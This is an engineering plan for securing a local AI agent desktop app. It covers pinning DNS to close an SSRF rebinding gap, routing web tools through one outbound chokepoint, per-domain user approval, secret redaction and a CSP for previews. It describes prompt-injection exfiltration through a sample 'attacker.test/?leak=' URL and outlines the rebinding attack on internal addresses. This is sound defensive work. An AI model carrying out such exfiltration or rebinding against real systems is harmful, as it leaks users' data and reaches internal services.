# Track 2 — Local Agent Safety (Option A) — Implementation Plan

> Execute **subagent-driven** with two-stage review (spec → quality) per change, plus an adversarial verify on the security-critical items. Steps use `- [ ]`.

**Goal:** Close the real safety gaps for a *local* agent that touches the user's files, tools, and the web — without the hosted/multi-tenant machinery (Option A).

**Repo/conventions:** `D:\Projects\open-claude-desktop`, branch `codex/days-1-3-containment-wip`. `PY = .venv/Scripts/python.exe` (Python 3.12). Run backend tests from `backend/` (e.g. `../.venv/Scripts/python.exe -m pytest tests/... -q`). TDD: failing test → run-red → implement → run-green → commit.

**Verified environment facts (checked before writing this):** httpx 0.28.1 / httpcore 1.0.9; `httpx.HTTPTransport` has **no** `network_backend` param (must swap the httpcore pool); `_blocked_ip` **already** handles IPv4-mapped IPv6 on Py3.12 (no fix needed there).

---

## Item 1 — Egress DNS-rebind TOCTOU pin  ✅ **DONE** (`7f2de68` + review-fix `024abf4`)

> Shipped: `_resolve_ips` + `_PinnedSyncBackend`/`_PinnedAsyncBackend` + `_PinnedHTTPTransport`/`_PinnedAsyncHTTPTransport`, wired into `safe_get` and `mcp_httpx_client_factory`. Spec review MEETS_SPEC; quality review found + fixed 4 issues (proxy pools fail closed, async DNS off the event loop, stale loopback fixture, `assert`→`raise`); adversarial verify PIN HOLDS across 7 attack classes. **Caveat that seeds Item 2a:** the pin protects only `egress.py`'s own clients — `web_fetch` and `web_search` use raw `httpx` and are still unpinned. Original detailed plan retained below for reference.

### Original plan (Item 1)

**The bug.** `egress.assert_public_url(url)` resolves the host with `getaddrinfo` and validates every address — but then `safe_get` and `mcp_httpx_client_factory` hand the **URL** to `httpx`, which **re-resolves the host independently** for the actual socket. A DNS-rebinding attacker returns a public IP during validation and `127.0.0.1` / `169.254.169.254` during the connect. Validation and connection use *different* resolutions → the SSRF guard is bypassable. (This is the residual gap called out in the audit and in the WIP's own `egress.py` docstring claim "validates every DNS answer before a connection is attempted" — which isn't true today because the answer isn't *pinned*.)

**The fix — pin the connection to the validated address.** Resolve+validate **once, at connect time, in the same resolution used for the socket**, so there is no window between check and use.

**Mechanism (verified against httpcore 1.0.9):** a custom network backend whose `connect_tcp(host, port, …)` resolves the host, validates every returned address with the existing `_blocked_ip`, and then connects to a **validated IP** (via `super().connect_tcp(<ip>, port, …)`). TLS `start_tls` still receives the real hostname from httpx, so certificate verification and SNI are correct. Because our backend does both the resolution and the connection, there is no TOCTOU window.

**Files:**
- Modify: `backend/ocd_core/egress.py` — add `_PinnedBackend` (sync, subclassing `httpcore.backends.sync.SyncBackend`) and `_AsyncPinnedBackend` (subclassing `httpcore.backends.anyio.AnyIOBackend`); a helper `_pinned_transport()` / `_pinned_async_transport()` that builds an `httpx.HTTPTransport`/`AsyncHTTPTransport` whose underlying `httpcore` pool uses the pinned backend; wire both into `safe_get` and `mcp_httpx_client_factory`.
- Test: `backend/tests/test_egress_toctou.py`

- [ ] **Step 1 — failing test: the rebinding attack is blocked at connect.**
  Simulate rebinding by monkeypatching the backend's resolver to return a **public** IP on the first call (validation) and a **private** IP on the second (connect); assert the pinned backend raises `EgressBlocked` (or never connects to the private IP), and that a control host resolving to a single public IP connects. Also assert `safe_get` and the MCP client both use the pinned backend (`isinstance(...)` on the transport's pool backend).
  ```python
  # sketch — the implementer verifies the exact httpcore hook names by running red first
  def test_pinned_backend_blocks_rebind(monkeypatch):
      from ocd_core import egress
      seq = iter(["8.8.8.8", "127.0.0.1"])          # validate public, then connect private
      monkeypatch.setattr(egress, "_resolve_ips", lambda host, port: [next(seq)])
      with pytest.raises(egress.EgressBlocked):
          egress._PinnedBackend().connect_tcp("evil.test", 443, timeout=5)
  ```
- [ ] **Step 2 — run red**, confirm it fails for the right reason (`AttributeError`/no `_PinnedBackend`).
- [ ] **Step 3 — implement** `_resolve_ips` (extract the getaddrinfo+validate out of `_resolved_addresses`), `_PinnedBackend.connect_tcp` (resolve→validate every addr→connect to a validated IP; raise `EgressBlocked` if any is blocked), the async twin, and `_pinned_transport()`/`_pinned_async_transport()`; wire into `safe_get` (sync) and `mcp_httpx_client_factory` (async).
- [ ] **Step 4 — run green.**
- [ ] **Step 5 — adversarial verify (subagent):** try to refute — IPv6 answers, multi-A-record hosts, a host that resolves public at validate and private at connect *inside a real httpx request* (not just the unit hook), literal-IP URLs, and TLS-to-a-real-host (e.g. `https://example.com`) still works. Fix anything that survives.
- [ ] **Step 6 — regression:** `test_egress_policy.py`, `test_connector_ssrf.py`, `test_mcp_oauth.py` still green; the MCP OAuth path still connects to legitimate hosts.
- [ ] **Step 7 — commit:** `fix(egress): pin DNS to the validated address (close SSRF rebind TOCTOU)`

**Non-goal for Item 1:** no IPv6-mapped fix (already handled); no egress *policy* changes (allow/deny lists stay as-is).

---

## Item 2 — Prompt-injection egress / DLP  *(re-scoped after recon — 2026-07-18)*

**Why re-scoped.** Recon of the actual code (not the outline's assumptions) found: (1) **no single egress chokepoint** — `web_fetch` (`integrations.py:1547`) and `web_search` (DDG `httpx.post` `:1318`, SearXNG `httpx.get` `:1334`) use *raw* `httpx` and bypass `egress.py` entirely, so any DLP hook placed only in `egress.py` misses the exact tools injection uses to exfiltrate; (2) **`web_fetch` still carries the Item-1 TOCTOU** — `_blocked_host` resolves once (`:1580`), then `client.stream` re-resolves at connect (`:1583`), on a plain (unpinned) `httpx.Client`; (3) the **approval primitive is fully reusable** (`permissions.PermissionRegistry.wait/resolve` + `approval_required` SSE + `ApprovalPrompt.tsx` — no new UI/route); (4) the outline's **protected-context heuristic is the weak link** — the KB is similarity-only (no enumeration API, `knowledge.py`), entropy/verbatim matching is false-positive-prone, and it isn't Option-A-shaped; but the user's **actual stored secret values** (`secrets.get_secret_store()`) give a *deterministic* redaction target. So: unify the outbound path first, then layer HITL + deterministic redaction, and drop the heuristic.

### Item 2a — Route `web_fetch` + `web_search` through the pinned path  ✅ **DONE** (`65a9d26` + review `7dfa2d4` + bypass fix `0168a92`)

> Shipped: `egress.pinned_client()`; `web_fetch` + DDG on the pinned path; SearXNG redirect-SSRF closed (loopback self-host preserved). Spec review MINOR_GAPS, quality review SHIP_WITH_NITS → fixed (EgressUnavailable so a DNS failure reads as `url_not_accessible` not a policy block; `pinned_client` rejects proxy/mounts; dead `_blocked_host` removed + tests re-homed). Adversarial verify PIN HOLDS across 9 attack classes and found **one real bypass** — CGNAT (100.64/10) via IPv4-mapped IPv6 escaped `_blocked_ip` — now fixed (also retroactively hardens Item 1's clients). 65 egress tests green.

**Goal.** Every agent-triggered outbound HTTP request opens its socket only to a validated IP (close the `web_fetch`/`web_search` DNS-rebind TOCTOU) and passes the egress domain policy — creating the single chokepoint 2b/2c hook into. Completes Item 1 (which fixed only `egress.py`'s clients).

**Files:** modify `backend/ocd_core/egress.py` (add a public pinned-client factory) and `backend/ocd_core/integrations.py` (`web_fetch`, `_ddg_html_results`, `_searxng_results`); new tests `backend/tests/test_egress_web_pin.py`.

- [ ] **1. egress.py — expose a pinned sync client factory.** Add `pinned_client(**kwargs) -> httpx.Client` returning `httpx.Client(transport=_PinnedHTTPTransport(), **kwargs)` (and, if a caller needs streaming, they use `client.stream(...)` on it — the pin is in the transport, so streaming is pinned too). No new backend code; reuse the Item-1 transport.
- [ ] **2. web_fetch (agent-controlled URL) — pin + full policy.** Replace `httpx.Client(...)` at `:1574` with `egress.pinned_client(timeout=15, follow_redirects=False)`; replace each `_blocked_host(hostname)` pre-check (`:1565`, `:1580`) with `egress.assert_public_url(cur)` (supersedes `_blocked_host`: scheme/creds/local-suffix/deny+allow-domains/port allowlist **and** private-IP block), catching `EgressBlocked` → the existing `url_not_allowed` error string. Keep the manual redirect loop, content-type filter, and `_WEB_FETCH_MAX_BYTES` stream cap unchanged. Net: pre-flight policy via `assert_public_url`, connect-time pin via the transport — the same belt-and-suspenders as `safe_get`. **Deliberate tightening to call out:** `assert_public_url` enforces the 80/443 port allowlist (`OCD_EGRESS_ALLOW_PORTS`), so an agent-supplied `:8443` URL is now refused — correct for an agent-fetched URL; note it in the commit.
- [ ] **3. web_search DDG (fixed host) — pin.** Route the `_DDG_URL` POST (`:1318`) through `egress.pinned_client(timeout=15, follow_redirects=False)`; keep the `data={"q": query}` body. DDG is a fixed public host, so this is defense-in-depth/consistency, cheap.
- [ ] **4. web_search SearXNG (user-configured base) — close the redirect-SSRF, but DON'T break local self-host.** Set `follow_redirects=False` on the `:1334` GET (was `True` — a redirect-to-internal SSRF surface on the agent-controlled query; this is the real fix here). **Do NOT** route it through `egress.pinned_client()` and **do NOT** run the base through `assert_public_url`: both block private IPs, which would break a user running SearXNG on `http://127.0.0.1:8888` — a legitimate Option-A setup. The base is *trusted config*, not agent-controlled; the agent controls only the query (goes to the trusted base) and can't force a rebind of the user's own host. So SearXNG stays on a **plain `httpx.Client(follow_redirects=False)`** — the deliberate trusted-config exception to the chokepoint (mirrors the Item-1 loopback-MCP decision). *(A future "pin-to-resolved-IP but allow-private" backend variant could pin it too while keeping loopback; out of scope for 2a.)* Note for 2b/2c: SearXNG is exempt from domain-approval (user's own configured endpoint) but its query should still be redaction-scanned.
- [ ] **5. Tests (`test_egress_web_pin.py`)** — reuse `_dns_sequence` + the `httpcore` `connect_tcp` spy from `test_egress_toctou.py`:
  - `web_fetch` rebind: public-at-validate, private-at-connect → the real backend is never asked to dial the private IP (spy) → returns `url_not_allowed`.
  - `web_fetch` uses a `_PinnedHTTPTransport` (assert the client's transport type via a construction spy).
  - `web_fetch` port tightening: an `https://host:8443/...` URL is refused.
  - SearXNG: a rebind on the base is blocked, **and** a `127.0.0.1` base is still allowed (proves local self-host isn't broken); `follow_redirects=False` on the client.
  - DDG: request goes through the pinned client.
  - Regression: existing `test_web_search.py` (function-level monkeypatch) and `test_connector_ssrf.py` stay green.
- [ ] **6. Adversarial verify (subagent):** try to reach a private IP through `web_fetch`/`web_search` (redirect-chain rebind, IPv6, the SearXNG base, multi-answer DNS) — ground-truth spy on the real backend. Nothing private may connect; local SearXNG base must still work.
- [ ] **7. Commit:** `fix(egress): route web_fetch + web_search through the pinned transport (close SSRF/TOCTOU, unify the outbound chokepoint)`

### Item 2b — First-contact domain approval + egress audit  ✅ **DONE** (`e2e0c61` + review `225bcd5`)

> Shipped: `egress_policy.py` (per-project host-approval registry + `outbound_host`); a domain gate at `agent.py:~1552` reusing the existing `approval_required`/`permissions.registry` flow (no new UI/route); egress-decision + SSRF-block audit. Spec review MEETS_SPEC; quality review NEEDS_FIXES → **F1 fixed** (strict/plan double-gate that falsely "Declined" an approved web_fetch — the sensitive gate now skips a call the domain gate just approved; strict-mode regression test added). **Deferred, documented:** F2 (redirect hops aren't re-gated — an approved host's open redirect can reach an unapproved one; tracked follow-up — thread the project's approved set into `web_fetch`); F3 (registry not workspace-scoped — only matters under `OCD_MULTI_TENANT=1`, which Option A drops). Tests: `test_egress_approval.py` (17). Detailed spec retained below.

<details><summary>Detailed 2b spec (as implemented)</summary>

**Threat.** Injected content drives the agent to `web_fetch("http://attacker.test/?leak=<local data>")`. SSRF pinning (2a) stops it reaching *internal* hosts, but not exfil to a *public* attacker domain. The Claude-Desktop-shaped control: the first time a turn reaches a **new domain**, ask the user (human-in-the-loop), reusing the approval UI we already have.

**Scope decisions (made — flag to change):**
- **Gate `web_fetch` only.** It's the one tool whose destination is an *arbitrary, agent-controlled* URL. `web_search` (fixed DDG / trusted SearXNG), MCP, and connectors all go to *fixed/user-configured* hosts — their domain is implicitly trusted by being configured, so gating them is pure noise. (If we later want connector-domain prompts, it's a one-line extension.)
- **Approval key = hostname** (`urlsplit(url).hostname.lower()`), not eTLD+1 — no public-suffix dependency; slightly tighter (each subdomain approved once). Note as a future refinement.
- **Per-project memory** (user's choice): a module-level `EgressApprovalRegistry` (mirroring `permissions.registry`), `approved: dict[project_key -> set[host]]`, in-memory (not persisted across restart yet — `ApprovalRecord` persistence is a later add). `project_key = active_project` (or its id); turns with no project key on `turn_id` (per-turn fallback).
- **Respect `perm_mode`.** Gate only when `gate_on` (`bool(turn_id) and perm_mode != "auto"`). In `auto` mode, auto-approve **but still audit**. Reuses the exact existing gate condition.
- **Reuse the approval flow verbatim.** Emit `approval_required` with `id = tc.id` (the real tool-call id), `name = "web_fetch"`, `input = args`, plus a `reason` naming the host; `await permissions.registry.wait(turn_id, tc.id, ...)`; the desktop's `ApprovalPrompt.tsx` + `POST /agent/turn/{turn_id}/permission` resolve it unchanged. On approve → record host for the project; on deny → skip the tool with a `web_fetch_tool_error: domain_not_approved (<host>)` result.

**Files:** new `backend/ocd_core/egress_policy.py` (registry + `outbound_host(tool_name, args) -> str | None`); `backend/ocd_core/agent.py` (the gate, next to the existing permission gate ~`:1552`); `backend/ocd_core/observability.py` (reuse `audit`, no change); optionally `integrations.py` (audit a `web_fetch` SSRF block). Tests: `backend/tests/test_egress_approval.py` (copy the `test_agent_hitl.py` registry-poll harness).

- [ ] **1. `egress_policy.py`** — `EgressApprovalRegistry` (`is_approved(key, host)`, `approve(key, host)`, `reset()` for tests) + module singleton `registry`; `outbound_host(tool_name, args)` returns the lowercased hostname for `web_fetch`, else `None`. Unit-test both.
- [ ] **2. Failing agent-loop test** — drive `run_turn(..., turn_id, permission_mode="ask")` with a fake `web_fetch`; assert it emits `approval_required` for a new host and suspends; a resolver approves via `permissions.registry.resolve`; assert the tool then runs, the host is recorded, and a **second** `web_fetch` to the same host in a later turn does NOT re-prompt (per-project memory). Separately assert deny → `domain_not_approved` and the tool never runs.
- [ ] **3. Implement the gate** in the loop: `host = egress_policy.outbound_host(name, args); if gate_on and host and not egress_policy.registry.is_approved(key, host): <emit approval_required, describe, await wait, audit, approve-or-skip>`. In `auto` mode or when already approved, skip the prompt but `audit({"event":"egress_decision", "decision": "auto"/"cached", ...})`.
- [ ] **4. Audit** every decision (`approved`/`denied`/`auto`/`cached`) via `observability.audit`; add one `audit({"event":"egress_blocked", ...})` where `web_fetch` turns `EgressBlocked` into `url_not_allowed` (so SSRF blocks land in the trail too — currently unlogged).
- [ ] **5. Green + regression:** `test_agent_hitl.py`, `test_permissions.py`, `test_agent_permission_route.py` stay green (the new gate must not disturb the existing sensitive-tool gate).
- [ ] **6. Commit:** `feat(egress): first-contact domain approval for web_fetch + egress audit trail`

*(No adversarial-verify stage for 2b — it's a HITL/UX control, not a new attack-surface boundary; spec + quality review suffice.)*

</details>

### Item 2c — Deterministic outbound redaction  *(detailed before we start it)*

At the 2a chokepoint, redact from outbound body + query + non-allowlisted headers: (1) **known secret VALUES** enumerated from `secrets.get_secret_store()` — zero false positives, these are literally the user's stored keys/tokens; (2) **hardened bare-token patterns** beyond the existing keyword-anchored `_scrub_secrets` (`integrations.py:1493`): `sk-…`, AWS `AKIA…`, GitHub `ghp_…`, JWTs, PEM blocks. Redaction is logged (audit). **Explicitly dropped:** the high-entropy / verbatim-from-KB heuristic (false positives, no KB enumeration API) — revisit under Item 3's data-provenance discussion if ever.

---

## Item 3 — Artifact preview CSP  *(outline — detailed before we start it)*

Model-generated HTML previews (`desktop/src/components/ArtifactPanel.tsx`) render raw model content and pull runtimes from public CDNs — a prompt-injected artifact can exfiltrate displayed data. Fixes:
- Inject a restrictive **CSP** (`default-src 'none'`; no network by default) into *every* preview document, including `kind === "html"`.
- **Vendor pinned** preview runtimes (Mermaid/React) instead of moving-version CDN URLs (also fixes offline + determinism).

Tests (desktop/vitest): a preview with a remote `<img>`/`fetch` is blocked by CSP; previews render offline.

---

## Non-goals (Option A)

No hosted egress proxy / org domain allowlists as a *service*, no centralized DLP pipeline, no per-tenant policy — those are Option-C. Everything here is local, deterministic, and on by default for the single user.

## Review process (per item)

Fresh implementer subagent → **spec-compliance review** → **code-quality review** → **adversarial verify** (security-critical items: Item 1 ✅, Item 2a) → commit. Same rigor as Phase 0.
